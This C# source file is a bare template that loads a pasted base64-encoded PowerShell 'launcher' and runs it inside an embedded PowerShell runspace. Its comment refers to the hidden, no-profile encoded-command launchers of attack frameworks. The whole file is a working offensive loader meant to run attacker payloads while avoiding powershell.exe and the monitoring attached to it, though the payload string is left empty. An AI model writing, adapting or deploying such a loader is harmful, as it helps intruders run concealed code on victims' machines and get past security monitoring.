using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Management.Automation;
using System.Collections.ObjectModel;

public class Program
{
    public static void Main()
    {
        PowerShell pstest = PowerShell.Create();
        //Paste encoded launcher string below (leave out powershell commands like "powershell -Sta -Nop -Window Hidden -EncodedCommand")
        String script = "";
        script = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(script));
        pstest.AddScript(script);
        Collection<PSObject> output = null;
        output = pstest.Invoke();
    }
}